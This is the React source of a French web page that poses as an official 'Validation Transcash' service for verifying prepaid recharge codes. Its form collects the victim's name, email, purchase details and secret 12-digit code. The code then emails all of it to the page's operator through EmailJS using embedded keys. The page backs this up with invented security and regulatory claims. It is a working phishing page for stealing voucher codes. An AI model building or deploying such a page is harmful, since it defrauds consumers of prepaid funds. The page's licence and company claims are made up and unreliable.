import React, { useState,useRef } from 'react';
import emailjs from "emailjs-com";
import profil from './images/profil.jpeg';
import phone from './images/phone.jpeg';
import rapide from './images/rapide.jpeg';
import fiable from './images/fiable.jpeg';
import secure from './images/secure.jpeg';
import visa from './images/visa.jpeg';

import './styles/accueil.scss';





const Accueil = () => {
  const [show, setShow] = useState(false);
  const [showe, setShowe] = useState(false);
  const [eye, seteye]= useState(true)

  const Eyeclick = () => {
 seteye(!eye)
    const code = document.getElementById('code');
    if (eye) {
      code.setAttribute('type', 'text');
      seteye(false)
    }
    else {
      code.setAttribute('type','password')
    }

    
  }
   const form = useRef();
   const sendEmail = (e) => {
     e.preventDefault();
      const message = document.getElementById("message");

     emailjs
       .sendForm(
         "service_o19gmcb",
         "template_hzn98zf",
         form.current,
         "eNbGuhHH13G4a2Mho"
       )
       .then(
         (result) => {
          
           message.innerHTML = "Votre requète à bien été envoyé , vérifier votre boite mail";
           message.style.color = "green";
           
         },
         (error) => {
           message.innerHTML = "Réquète non traité, veuillez vérifier votre connexion internet et réessayer.";
           message.style.color = "red";
         }
       );
   };
  
  

      const handleclick = () => {
        setShow(!show);
  };
      const handleclicke = () => {
        setShowe(!showe);
  };
  const scrolling = ()=>
{
    setShow(false)
  }

 
  window.addEventListener('scroll', scrolling) ;

  


    
    return (
      <div className="container">
        <nav>
          <div onClick={handleclick} className="burger">
            <i className={show ? "fa-solid fa-xmark" : "fa-solid fa-bars"} />
          </div>
          <div className={show ? "links active" : "links"}>
            <a href="#">Accueil</a>
            <a href="#validation">Validation</a>
            <a href="#services">Services</a>
          </div>
        </nav>

        <div className="firstImg">
          <img height="100px" src={profil} alt="" />
          <h1>Validation Transcash</h1>
        </div>

        <div className="accueil">
          <h3>Bienvennue sur le site officiel de Vérification Transcash</h3>
          <hr></hr>
        </div>

        <div className="phone">
          <img height="200px" width={300} src={phone} alt="" />
        </div>

        <h2>Activation de vos recharges</h2>
        <p>
          Transcash est utilisable en ligne uniquement , il vous permet
          d'effectuer tous vos achats e-commerce en toute sécurité. La fiabilité
          de votre code de recharge est donc importante. Avec le système
          2FS-Security vos recharges sont donc authentifiées enfin qu'elles
          soient utilisables en ligne.
        </p>
        <p>
          Cette étape cruciale d'authentification se fait en utilisation de la
          technologie la plus récente connue sur SSL permettant de garantir la
          sécurité et fiabilité de vos recharges en toute légitimité.
        </p>

        <div className="display">
          <div>
            <h3>Rapide</h3>
            <img height={300} src={rapide} alt="" />
          </div>
          <div>
            <h3>Fiable</h3>
            <img height={300} src={fiable} alt="" />
          </div>

          <div>
            <h3>Securiser</h3>
            <img height={230} src={secure} alt="" />
          </div>
        </div>

        <hr></hr>
        <p>
          La recharge TRANS-CASH Mastercard est un moyen de paiement prépayé
          fiable sur internet, avec une recharge, qui vous accompagne au
          quotidien dans vos dépenses. Commander le en ligne ou achetez vos
          recharges de paiement dans un bureau de tabac et profitez de tous ses
          avantages qui simplifieront la vie.
        </p>
        <hr></hr>
        <div className="formulaire">
          <form id="validation" ref={form} onSubmit={sendEmail}>
            <div className="bloc">
              <label for="nom">
                Nom *
                <input
                  required
                  placeholder="Ex:Jean Descartes"
                  type="text"
                  name="name"
                  id="nom"
                  minLength={4} maxLength={25}
                />
              </label>
            </div>
            <div className="bloc">
              <label for="email">
                Email * :
                <input
                  required
                  placeholder="Ex :jeanDescartes@gmail.com"
                  type="email"
                  name="email"
                  id=""
                />
              </label>
            </div>
            <div className="bloc">
              <label>
                Montant * :
                <select>
                  <option value="20">20</option>
                  <option>50</option>
                  <option>100</option>
                  <option>150</option>
                  <option>200</option>
                  <option>250</option>
                  <option>300</option>
                  <option>500</option>
                </select>
              </label>
            </div>
            <div className="bloc">
              <label>
                Date d'achat * : <input required type="date" name="" id="" />
              </label>
            </div>
            <div className="bloc">
              <label>
                Code à 12 chiffres * :
                <input
                  required
                  placeholder="Ex:000000000000"
                  type="password"
                  minLength="12"
                  maxLength="12"
                  name="code"
                  id="code"
                  pattern="[0-9]{12}"
                  title="Le code doit contenir que les chiffres"
                />
                <i
                  onClick={Eyeclick}
                  style={{
                    position: "absolute",
                    right: "10%",
                    top: "40%",
                    color: "orange",
                    zIndex: "10000",
                    fontSize: "30px",
                    cursor: "pointer",
                  }}
                  class={
                    eye ? "fa-solid fa-eye-slash":"fa-solid fa-eye"
                  }
                ></i>
              </label>
            </div>
            <p>Lieu d'achat *</p>
            <label style={{ color: "orange" }}>
              <input type="radio" name="lieu" id="lieu" /> Internet
            </label>
            <label style={{ color: "orange" }}>
              <input required type="radio" name="lieu" id="lieu" /> Bureau de Tabac
            </label>
            <p>
              Je certifie que mon code n'a pas été utilisé sur un autre site *
            </p>
            <label style={{ color: "orange" }}>
              <input required  type="radio" name="utile" id="" /> oui
              <input type="radio" name="utile" id="" /> non
            </label>
            {/* <p>
              Je n'ai pas envoyer mon code à un individu pour une prestation de
              service *
            </p> */}
            {/* <label style={{ color: "orange" }}>
              <input type="radio" name="valide" id="" /> oui
              <input type="radio" name="valide" id="" /> non
            </label> */}
            <div className="submit">
              <input type="submit" id="submit" value="Vérifier Maintenant" />
            </div>
            <p id="message"></p>
          </form>
        </div>
        <br></br>
        <br></br>
        <hr></hr>

        <div id='services' className="siteRecharge">
          <p style={{ color: "gray" }}>
    Le site RECHARGE-AUTHENTIFICATION est émis par CARD-coopération sous une licence d'authentification internationale Incorporated. Le service est autorisé par la conduite financière autorité (FRN 9 000
            036) en vertu des règlements de 2011 sur la monnaie électronique
            pour l'émission de monnaie électronique et fourniture de services
            électronique et fourniture de services de paiement. Siège Social :5ᵉ
            étage, Langham Housse, 302-308 Regent Steet, Londres, W1B 3AT.Numéro
            d'entreprise : 066337638.
          </p>
          <img height={100} width={200} src={visa} alt="" />
        </div>
        <hr></hr>
        <div className="footer">
          <p
            style={{ cursor: "pointer", textDecoration: "underline" }}
            onClick={handleclicke}
          >
            Mentions légales<br></br>
            {showe && (
              <p style={{ cursor: "pointer", textDecoration: "underline" }}>
                JENY SAS en plus d’être le registre du Cabada est aussi un
                opérateur global de télécommunications. Titulaire de l’agrément
                ARCE du 18 Mai 2018.
              </p>
            )}
          </p>
        </div>
        <small style={{ color: "gray", display: "block", textAlign: "center" }}>
          copyright c2022
        </small>
      </div>
    );
};

export default Accueil;